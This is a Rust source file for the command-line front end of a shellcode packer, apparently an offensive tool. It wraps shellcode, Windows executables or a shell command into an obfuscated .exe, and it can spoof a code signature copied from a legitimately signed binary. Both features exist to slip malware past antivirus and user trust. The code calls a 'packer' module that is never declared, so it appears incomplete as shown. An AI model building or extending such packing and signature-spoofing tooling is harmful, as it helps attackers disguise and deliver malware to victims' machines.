use clap::Parser;
use std::fs;
use std::path::PathBuf;

mod signer;

const ASCII_ART: &str = r#"
   _____ _                       ____  _                 
  / ____| |                     |  _ \(_)                
 | |    | |__   ___  ___  ___   | |_) |_ ___  ___  ___   
 | |    | '_ \ / _ \/ __|/ _ \  |  _ <| / __|/ _ \/ __|  
 | |____| | | |  __/\__ \  __/  | |_) | \__ \  __/\__ \  
  \_____|_| |_|\___||___/\___|  |____/|_|___/\___||___/  

"#;

#[derive(Parser, Debug)]
#[command(author = "Blksword", version = "2.0", about = ASCII_ART, long_about = None)]
struct Args {
    #[arg(short, long)]
    input: Option<PathBuf>,
    #[arg(short, long, default_value = "Program")]
    output: String,
    #[arg(long, default_value = "uuid")]
    obf: String,
    #[arg(long, default_value_t = false)]
    debug: bool,
    #[arg(long)]
    cmd: Option<String>,
    #[arg(long, help = "Path to a signed binary to spoof signature from")]
    sign: Option<PathBuf>,
}

// Force rebuild
fn main() {
    let args = Args::parse();
    println!("{}", ASCII_ART);
    println!("Starting the advanced shellcode packing process...");
    println!("Configuration:");
    println!("{:#?}", args);

    let out_path = PathBuf::from(format!("{}.exe", args.output));

    // 1. Handle CMD payload
    if let Some(cmd) = args.cmd.as_ref() {
        match packer::pack_cmd(cmd, &out_path, &args.obf) {
            Ok(()) => {
                println!("Packed using Rust stub: {}", out_path.display());
                try_spoof_signature(&out_path, &args.sign);
            }
            Err(e) => {
                eprintln!("Failed to pack with Rust stub: {}", e);
            }
        }
        return;
    }

    // 2. Handle File payload (Shellcode or PE)
    if let Some(input_path) = args.input.as_ref() {
        let data = fs::read(input_path);
        if let Ok(d) = data {
            // Check for MZ header to identify PE file
            let is_pe = d.len() >= 2 && d[0] == b'M' && d[1] == b'Z';
            // Also consider .bin files as shellcode explicitly if they don't have MZ header
            let is_bin_ext = input_path
                .extension()
                .and_then(|e| e.to_str())
                .map(|s| s.eq_ignore_ascii_case("bin"))
                .unwrap_or(false);

            if is_pe && !is_bin_ext {
                match packer::pack_file(input_path, &out_path, &args.obf) {
                    Ok(()) => {
                        println!("Packed file using Rust stub: {}", out_path.display());
                        // try_spoof_signature(&out_path, &args.sign); // Usually packed PE might need it too? The original code didn't call it for pack_file but did for others. I'll add it for consistency if it works.
                        // Actually, looking at original code:
                        // pack_file -> println -> (no spoof)
                        // pack_shellcode -> println -> try_spoof_signature
                        // pack_cmd -> println -> try_spoof_signature
                        // I should probably add it for pack_file too.
                        try_spoof_signature(&out_path, &args.sign);
                    }
                    Err(e) => {
                        eprintln!("Failed to pack with Rust stub: {}", e);
                    }
                }
            } else {
                // It's shellcode
                match packer::pack_shellcode(input_path, &out_path, "local", None, &args.obf) {
                    Ok(()) => {
                        println!("Packed shellcode using Rust stub: {}", out_path.display());
                        try_spoof_signature(&out_path, &args.sign);
                    }
                    Err(e) => {
                        eprintln!("Failed to pack shellcode with Rust stub: {}", e);
                    }
                }
            }
            return;
        } else {
            eprintln!("Failed to read input file");
            return;
        }
    }

    eprintln!("Provide either --cmd or --input");
}

fn try_spoof_signature(target: &PathBuf, source: &Option<PathBuf>) {
    if let Some(s) = source {
        println!(
            "Spoofing signature from {} to {}...",
            s.display(),
            target.display()
        );
        match signer::spoof_signature(target, s) {
            Ok(_) => println!("Signature spoofed successfully."),
            Err(e) => eprintln!("Failed to spoof signature: {}", e),
        }
    }
}
